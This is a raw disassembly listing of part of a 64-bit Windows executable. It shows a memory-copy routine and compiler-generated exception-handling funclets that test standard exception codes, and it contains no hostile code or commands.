   14000d90a:	0f 10 4c 11 20       	movups 0x20(%rcx,%rdx,1),%xmm1
   14000d90f:	0f 29 41 30          	movaps %xmm0,0x30(%rcx)
   14000d913:	0f 29 49 20          	movaps %xmm1,0x20(%rcx)
   14000d917:	0f 10 44 11 10       	movups 0x10(%rcx,%rdx,1),%xmm0
   14000d91c:	0f 10 0c 11          	movups (%rcx,%rdx,1),%xmm1
   14000d920:	75 ae                	jne    0x14000d8d0
   14000d922:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   14000d926:	49 83 e0 7f          	and    $0x7f,%r8
   14000d92a:	0f 28 c1             	movaps %xmm1,%xmm0
   14000d92d:	4d 8b c8             	mov    %r8,%r9
   14000d930:	49 c1 e9 04          	shr    $0x4,%r9
   14000d934:	74 1a                	je     0x14000d950
   14000d936:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000d93d:	00 00 00 
   14000d940:	0f 11 01             	movups %xmm0,(%rcx)
   14000d943:	48 83 e9 10          	sub    $0x10,%rcx
   14000d947:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   14000d94b:	49 ff c9             	dec    %r9
   14000d94e:	75 f0                	jne    0x14000d940
   14000d950:	49 83 e0 0f          	and    $0xf,%r8
   14000d954:	74 03                	je     0x14000d959
   14000d956:	0f 11 10             	movups %xmm2,(%rax)
   14000d959:	0f 11 01             	movups %xmm0,(%rcx)
   14000d95c:	c3                   	ret
   14000d95d:	cc                   	int3
   14000d95e:	cc                   	int3
   14000d95f:	cc                   	int3
   14000d960:	cc                   	int3
   14000d961:	cc                   	int3
   14000d962:	cc                   	int3
   14000d963:	cc                   	int3
   14000d964:	cc                   	int3
   14000d965:	cc                   	int3
   14000d966:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000d96d:	00 00 00 
   14000d970:	40 55                	rex push %rbp
   14000d972:	48 83 ec 20          	sub    $0x20,%rsp
   14000d976:	48 8b ea             	mov    %rdx,%rbp
   14000d979:	48 8b 01             	mov    (%rcx),%rax
   14000d97c:	48 8b d1             	mov    %rcx,%rdx
   14000d97f:	8b 08                	mov    (%rax),%ecx
   14000d981:	e8 8a 69 ff ff       	call   0x140004310
   14000d986:	90                   	nop
   14000d987:	48 83 c4 20          	add    $0x20,%rsp
   14000d98b:	5d                   	pop    %rbp
   14000d98c:	c3                   	ret
   14000d98d:	cc                   	int3
   14000d98e:	40 55                	rex push %rbp
   14000d990:	48 8b ea             	mov    %rdx,%rbp
   14000d993:	48 8b 01             	mov    (%rcx),%rax
   14000d996:	33 c9                	xor    %ecx,%ecx
   14000d998:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000d99e:	0f 94 c1             	sete   %cl
   14000d9a1:	8b c1                	mov    %ecx,%eax
   14000d9a3:	5d                   	pop    %rbp
   14000d9a4:	c3                   	ret
   14000d9a5:	cc                   	int3
   14000d9a6:	40 53                	rex push %rbx
   14000d9a8:	55                   	push   %rbp
   14000d9a9:	48 83 ec 28          	sub    $0x28,%rsp
   14000d9ad:	48 8b ea             	mov    %rdx,%rbp
   14000d9b0:	48 89 4d 38          	mov    %rcx,0x38(%rbp)
   14000d9b4:	48 89 4d 30          	mov    %rcx,0x30(%rbp)
   14000d9b8:	80 7d 58 00          	cmpb   $0x0,0x58(%rbp)
   14000d9bc:	74 6c                	je     0x14000da2a
   14000d9be:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000d9c2:	48 8b 08             	mov    (%rax),%rcx
   14000d9c5:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   14000d9c9:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000d9cd:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   14000d9d3:	75 55                	jne    0x14000da2a
   14000d9d5:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000d9d9:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   14000d9dd:	75 4b                	jne    0x14000da2a
   14000d9df:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000d9e3:	81 78 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rax)
   14000d9ea:	74 1a                	je     0x14000da06
   14000d9ec:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000d9f0:	81 78 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rax)
   14000d9f7:	74 0d                	je     0x14000da06
   14000d9f9:	48 8b 45 28          	mov    0x28(%rbp),%rax
   14000d9fd:	81 78 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rax)
   14000da04:	75 24                	jne    0x14000da2a
   14000da06:	e8 21 46 ff ff       	call   0x14000202c
   14000da0b:	48 8b 4d 28          	mov    0x28(%rbp),%rcx
   14000da0f:	48 89 48 20          	mov    %rcx,0x20(%rax)
   14000da13:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000da17:	48 8b 58 08          	mov    0x8(%rax),%rbx
   14000da1b:	e8 0c 46 ff ff       	call   0x14000202c
   14000da20:	48 89 58 28          	mov    %rbx,0x28(%rax)
   14000da24:	e8 f7 7b ff ff       	call   0x140005620
   14000da29:	90                   	nop
   14000da2a:	c7 45 20 00 00 00 00 	movl   $0x0,0x20(%rbp)
   14000da31:	8b 45 20             	mov    0x20(%rbp),%eax
   14000da34:	48 83 c4 28          	add    $0x28,%rsp
   14000da38:	5d                   	pop    %rbp
   14000da39:	5b                   	pop    %rbx
   14000da3a:	c3                   	ret
   14000da3b:	cc                   	int3
   14000da3c:	40 53                	rex push %rbx
   14000da3e:	55                   	push   %rbp
   14000da3f:	57                   	push   %rdi
   14000da40:	48 83 ec 40          	sub    $0x40,%rsp
   14000da44:	48 8b ea             	mov    %rdx,%rbp
   14000da47:	48 89 4d 50          	mov    %rcx,0x50(%rbp)
   14000da4b:	48 89 4d 48          	mov    %rcx,0x48(%rbp)
   14000da4f:	e8 d8 45 ff ff       	call   0x14000202c
   14000da54:	48 8b 8d 80 00 00 00 	mov    0x80(%rbp),%rcx
   14000da5b:	48 89 48 70          	mov    %rcx,0x70(%rax)
   14000da5f:	48 8b bd 98 00 00 00 	mov    0x98(%rbp),%rdi
   14000da66:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   14000da6a:	e8 bd 45 ff ff       	call   0x14000202c
   14000da6f:	48 89 58 60          	mov    %rbx,0x60(%rax)
   14000da73:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000da77:	48 8b 08             	mov    (%rax),%rcx
   14000da7a:	48 8b 59 38          	mov    0x38(%rcx),%rbx
   14000da7e:	e8 a9 45 ff ff       	call   0x14000202c
   14000da83:	48 89 58 68          	mov    %rbx,0x68(%rax)
   14000da87:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   14000da8b:	c6 44 24 38 01       	movb   $0x1,0x38(%rsp)
   14000da90:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000da96:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   14000da9b:	48 8b 85 a0 00 00 00 	mov    0xa0(%rbp),%rax
   14000daa2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000daa7:	4c 8b cf             	mov    %rdi,%r9
   14000daaa:	4c 8b 85 90 00 00 00 	mov    0x90(%rbp),%r8
   14000dab1:	48 8b 95 88 00 00 00 	mov    0x88(%rbp),%rdx
   14000dab8:	48 8b 09             	mov    (%rcx),%rcx
   14000dabb:	e8 38 5f ff ff       	call   0x1400039f8
   14000dac0:	e8 67 45 ff ff       	call   0x14000202c
   14000dac5:	48 83 60 70 00       	andq   $0x0,0x70(%rax)
   14000daca:	c7 45 40 01 00 00 00 	movl   $0x1,0x40(%rbp)
   14000dad1:	c7 45 44 01 00 00 00 	movl   $0x1,0x44(%rbp)
   14000dad8:	8b 45 44             	mov    0x44(%rbp),%eax
   14000dadb:	48 83 c4 40          	add    $0x40,%rsp
   14000dadf:	5f                   	pop    %rdi
   14000dae0:	5d                   	pop    %rbp
   14000dae1:	5b                   	pop    %rbx
   14000dae2:	c3                   	ret
   14000dae3:	cc                   	int3
   14000dae4:	40 55                	rex push %rbp
   14000dae6:	48 83 ec 20          	sub    $0x20,%rsp
   14000daea:	48 8b ea             	mov    %rdx,%rbp
   14000daed:	48 89 4d 58          	mov    %rcx,0x58(%rbp)
   14000daf1:	4c 8d 45 20          	lea    0x20(%rbp),%r8
   14000daf5:	48 8b 95 b8 00 00 00 	mov    0xb8(%rbp),%rdx
   14000dafc:	e8 d3 61 ff ff       	call   0x140003cd4
   14000db01:	90                   	nop
   14000db02:	48 83 c4 20          	add    $0x20,%rsp
   14000db06:	5d                   	pop    %rbp
   14000db07:	c3                   	ret
   14000db08:	cc                   	int3
   14000db09:	40 53                	rex push %rbx
   14000db0b:	55                   	push   %rbp
   14000db0c:	48 83 ec 28          	sub    $0x28,%rsp
   14000db10:	48 8b ea             	mov    %rdx,%rbp
   14000db13:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   14000db17:	e8 44 4e ff ff       	call   0x140002960
   14000db1c:	83 7d 20 00          	cmpl   $0x0,0x20(%rbp)
   14000db20:	75 48                	jne    0x14000db6a
   14000db22:	48 8b 9d b8 00 00 00 	mov    0xb8(%rbp),%rbx
   14000db29:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   14000db2f:	75 39                	jne    0x14000db6a
   14000db31:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   14000db35:	75 33                	jne    0x14000db6a
   14000db37:	81 7b 20 20 05 93 19 	cmpl   $0x19930520,0x20(%rbx)
   14000db3e:	74 12                	je     0x14000db52
   14000db40:	81 7b 20 21 05 93 19 	cmpl   $0x19930521,0x20(%rbx)
   14000db47:	74 09                	je     0x14000db52
   14000db49:	81 7b 20 22 05 93 19 	cmpl   $0x19930522,0x20(%rbx)
   14000db50:	75 18                	jne    0x14000db6a
   14000db52:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   14000db56:	e8 1d 43 ff ff       	call   0x140001e78
   14000db5b:	85 c0                	test   %eax,%eax
   14000db5d:	74 0b                	je     0x14000db6a
   14000db5f:	b2 01                	mov    $0x1,%dl
   14000db61:	48 8b cb             	mov    %rbx,%rcx
   14000db64:	e8 9b 42 ff ff       	call   0x140001e04
   14000db69:	90                   	nop
   14000db6a:	e8 bd 44 ff ff       	call   0x14000202c
   14000db6f:	48 8b 8d c0 00 00 00 	mov    0xc0(%rbp),%rcx
   14000db76:	48 89 48 20          	mov    %rcx,0x20(%rax)
   14000db7a:	e8 ad 44 ff ff       	call   0x14000202c
   14000db7f:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   14000db83:	48 89 48 28          	mov    %rcx,0x28(%rax)
   14000db87:	48 83 c4 28          	add    $0x28,%rsp
   14000db8b:	5d                   	pop    %rbp
   14000db8c:	5b                   	pop    %rbx
   14000db8d:	c3                   	ret
   14000db8e:	cc                   	int3
   14000db8f:	40 55                	rex push %rbp
   14000db91:	48 83 ec 20          	sub    $0x20,%rsp
   14000db95:	48 8b ea             	mov    %rdx,%rbp
   14000db98:	e8 2f 43 ff ff       	call   0x140001ecc
   14000db9d:	90                   	nop
   14000db9e:	48 83 c4 20          	add    $0x20,%rsp
   14000dba2:	5d                   	pop    %rbp
   14000dba3:	c3                   	ret
   14000dba4:	cc                   	int3
   14000dba5:	40 55                	rex push %rbp
   14000dba7:	48 83 ec 20          	sub    $0x20,%rsp
   14000dbab:	48 8b ea             	mov    %rdx,%rbp
   14000dbae:	e8 79 44 ff ff       	call   0x14000202c
   14000dbb3:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   14000dbb7:	7e 08                	jle    0x14000dbc1
   14000dbb9:	e8 6e 44 ff ff       	call   0x14000202c
   14000dbbe:	ff 48 30             	decl   0x30(%rax)
   14000dbc1:	48 83 c4 20          	add    $0x20,%rsp
   14000dbc5:	5d                   	pop    %rbp
   14000dbc6:	c3                   	ret
   14000dbc7:	cc                   	int3
   14000dbc8:	40 55                	rex push %rbp
   14000dbca:	48 83 ec 20          	sub    $0x20,%rsp
   14000dbce:	48 8b ea             	mov    %rdx,%rbp
   14000dbd1:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000dbd5:	8b 08                	mov    (%rax),%ecx
   14000dbd7:	48 83 c4 20          	add    $0x20,%rsp
   14000dbdb:	5d                   	pop    %rbp
   14000dbdc:	e9 5b 9e ff ff       	jmp    0x140007a3c
   14000dbe1:	cc                   	int3
   14000dbe2:	40 55                	rex push %rbp
   14000dbe4:	48 83 ec 20          	sub    $0x20,%rsp
   14000dbe8:	48 8b ea             	mov    %rdx,%rbp
   14000dbeb:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   14000dbef:	48 8b 01             	mov    (%rcx),%rax
   14000dbf2:	8b 08                	mov    (%rax),%ecx
   14000dbf4:	89 4d 24             	mov    %ecx,0x24(%rbp)
   14000dbf7:	33 c0                	xor    %eax,%eax
   14000dbf9:	81 f9 63 73 6d e0    	cmp    $0xe06d7363,%ecx
   14000dbff:	0f 94 c0             	sete   %al
   14000dc02:	89 45 20             	mov    %eax,0x20(%rbp)
   14000dc05:	8b 45 20             	mov    0x20(%rbp),%eax
   14000dc08:	48 83 c4 20          	add    $0x20,%rsp
   14000dc0c:	5d                   	pop    %rbp
   14000dc0d:	c3                   	ret
   14000dc0e:	cc                   	int3
   14000dc0f:	40 55                	rex push %rbp
   14000dc11:	48 83 ec 20          	sub    $0x20,%rsp
   14000dc15:	48 8b ea             	mov    %rdx,%rbp
   14000dc18:	48 8b 45 58          	mov    0x58(%rbp),%rax
   14000dc1c:	8b 08                	mov    (%rax),%ecx
   14000dc1e:	48 83 c4 20          	add    $0x20,%rsp
   14000dc22:	5d                   	pop    %rbp
   14000dc23:	e9 14 9e ff ff       	jmp    0x140007a3c
   14000dc28:	cc                   	int3
   14000dc29:	40 55                	rex push %rbp
   14000dc2b:	48 83 ec 20          	sub    $0x20,%rsp
   14000dc2f:	48 8b ea             	mov    %rdx,%rbp
   14000dc32:	48 8b 45 68          	mov    0x68(%rbp),%rax
   14000dc36:	8b 08                	mov    (%rax),%ecx
   14000dc38:	48 83 c4 20          	add    $0x20,%rsp
   14000dc3c:	5d                   	pop    %rbp
   14000dc3d:	e9 fa 9d ff ff       	jmp    0x140007a3c
   14000dc42:	cc                   	int3
   14000dc43:	40 55                	rex push %rbp
   14000dc45:	48 83 ec 20          	sub    $0x20,%rsp
   14000dc49:	48 8b ea             	mov    %rdx,%rbp
   14000dc4c:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000dc51:	48 83 c4 20          	add    $0x20,%rsp
   14000dc55:	5d                   	pop    %rbp
   14000dc56:	e9 e1 9d ff ff       	jmp    0x140007a3c
   14000dc5b:	cc                   	int3
   14000dc5c:	40 55                	rex push %rbp
   14000dc5e:	48 83 ec 20          	sub    $0x20,%rsp
   14000dc62:	48 8b ea             	mov    %rdx,%rbp
   14000dc65:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000dc6a:	48 83 c4 20          	add    $0x20,%rsp
   14000dc6e:	5d                   	pop    %rbp
   14000dc6f:	e9 c8 9d ff ff       	jmp    0x140007a3c
   14000dc74:	cc                   	int3
   14000dc75:	40 55                	rex push %rbp
   14000dc77:	48 83 ec 20          	sub    $0x20,%rsp
   14000dc7b:	48 8b ea             	mov    %rdx,%rbp
   14000dc7e:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000dc83:	48 83 c4 20          	add    $0x20,%rsp
   14000dc87:	5d                   	pop    %rbp
   14000dc88:	e9 af 9d ff ff       	jmp    0x140007a3c
   14000dc8d:	cc                   	int3
   14000dc8e:	40 55                	rex push %rbp
   14000dc90:	48 83 ec 20          	sub    $0x20,%rsp
   14000dc94:	48 8b ea             	mov    %rdx,%rbp
   14000dc97:	33 c9                	xor    %ecx,%ecx
   14000dc99:	48 83 c4 20          	add    $0x20,%rsp
   14000dc9d:	5d                   	pop    %rbp
   14000dc9e:	e9 99 9d ff ff       	jmp    0x140007a3c
   14000dca3:	cc                   	int3
   14000dca4:	40 55                	rex push %rbp
   14000dca6:	48 83 ec 20          	sub    $0x20,%rsp
   14000dcaa:	48 8b ea             	mov    %rdx,%rbp
   14000dcad:	80 7d 70 00          	cmpb   $0x0,0x70(%rbp)
   14000dcb1:	74 0b                	je     0x14000dcbe
   14000dcb3:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000dcb8:	e8 7f 9d ff ff       	call   0x140007a3c
   14000dcbd:	90                   	nop
   14000dcbe:	48 83 c4 20          	add    $0x20,%rsp
   14000dcc2:	5d                   	pop    %rbp
   14000dcc3:	c3                   	ret
   14000dcc4:	cc                   	int3
   14000dcc5:	40 55                	rex push %rbp
   14000dcc7:	48 83 ec 20          	sub    $0x20,%rsp
   14000dccb:	48 8b ea             	mov    %rdx,%rbp
   14000dcce:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   14000dcd2:	48 8b 09             	mov    (%rcx),%rcx
   14000dcd5:	48 83 c4 20          	add    $0x20,%rsp
   14000dcd9:	5d                   	pop    %rbp
   14000dcda:	e9 bd ba ff ff       	jmp    0x14000979c
   14000dcdf:	cc                   	int3
   14000dce0:	40 55                	rex push %rbp
   14000dce2:	48 83 ec 20          	sub    $0x20,%rsp
   14000dce6:	48 8b ea             	mov    %rdx,%rbp
   14000dce9:	48 8b 85 98 00 00 00 	mov    0x98(%rbp),%rax
   14000dcf0:	8b 08                	mov    (%rax),%ecx
   14000dcf2:	48 83 c4 20          	add    $0x20,%rsp
   14000dcf6:	5d                   	pop    %rbp
   14000dcf7:	e9 40 9d ff ff       	jmp    0x140007a3c
   14000dcfc:	cc                   	int3
   14000dcfd:	40 55                	rex push %rbp
   14000dcff:	48 83 ec 20          	sub    $0x20,%rsp
   14000dd03:	48 8b ea             	mov    %rdx,%rbp
   14000dd06:	48 8b 45 48          	mov    0x48(%rbp),%rax
   14000dd0a:	8b 08                	mov    (%rax),%ecx
   14000dd0c:	48 83 c4 20          	add    $0x20,%rsp
   14000dd10:	5d                   	pop    %rbp
   14000dd11:	e9 46 9f ff ff       	jmp    0x140007c5c
   14000dd16:	cc                   	int3
   14000dd17:	40 55                	rex push %rbp
   14000dd19:	48 83 ec 30          	sub    $0x30,%rsp
   14000dd1d:	48 8b ea             	mov    %rdx,%rbp
   14000dd20:	8b 4d 60             	mov    0x60(%rbp),%ecx
   14000dd23:	48 83 c4 30          	add    $0x30,%rsp
   14000dd27:	5d                   	pop    %rbp
   14000dd28:	e9 2f 9f ff ff       	jmp    0x140007c5c
   14000dd2d:	cc                   	int3
   14000dd2e:	40 55                	rex push %rbp
   14000dd30:	48 83 ec 20          	sub    $0x20,%rsp
   14000dd34:	48 8b ea             	mov    %rdx,%rbp
   14000dd37:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000dd3c:	48 83 c4 20          	add    $0x20,%rsp
   14000dd40:	5d                   	pop    %rbp
   14000dd41:	e9 f6 9c ff ff       	jmp    0x140007a3c
   14000dd46:	cc                   	int3
   14000dd47:	40 55                	rex push %rbp
   14000dd49:	48 83 ec 30          	sub    $0x30,%rsp
   14000dd4d:	48 8b ea             	mov    %rdx,%rbp
   14000dd50:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   14000dd54:	48 83 c4 30          	add    $0x30,%rsp
   14000dd58:	5d                   	pop    %rbp
   14000dd59:	e9 3e ba ff ff       	jmp    0x14000979c
   14000dd5e:	cc                   	int3
   14000dd5f:	40 55                	rex push %rbp
   14000dd61:	48 83 ec 20          	sub    $0x20,%rsp
   14000dd65:	48 8b ea             	mov    %rdx,%rbp
   14000dd68:	48 8b 01             	mov    (%rcx),%rax
   14000dd6b:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000dd71:	74 0c                	je     0x14000dd7f
   14000dd73:	81 38 1d 00 00 c0    	cmpl   $0xc000001d,(%rax)
   14000dd79:	74 04                	je     0x14000dd7f
   14000dd7b:	33 c0                	xor    %eax,%eax
   14000dd7d:	eb 05                	jmp    0x14000dd84
   14000dd7f:	b8 01 00 00 00       	mov    $0x1,%eax
   14000dd84:	48 83 c4 20          	add    $0x20,%rsp
   14000dd88:	5d                   	pop    %rbp
   14000dd89:	c3                   	ret
   14000dd8a:	cc                   	int3
   14000dd8b:	cc                   	int3
   14000dd8c:	cc                   	int3
   14000dd8d:	cc                   	int3
   14000dd8e:	cc                   	int3
   14000dd8f:	cc                   	int3
   14000dd90:	40 55                	rex push %rbp
   14000dd92:	48 83 ec 20          	sub    $0x20,%rsp
   14000dd96:	48 8b ea             	mov    %rdx,%rbp
   14000dd99:	48 8b 01             	mov    (%rcx),%rax
   14000dd9c:	33 c9                	xor    %ecx,%ecx
   14000dd9e:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   14000dda4:	0f 94 c1             	sete   %cl
   14000dda7:	8b c1                	mov    %ecx,%eax
   14000dda9:	48 83 c4 20          	add    $0x20,%rsp
   14000ddad:	5d                   	pop    %rbp
   14000ddae:	c3                   	ret
   14000ddaf:	cc                   	int3
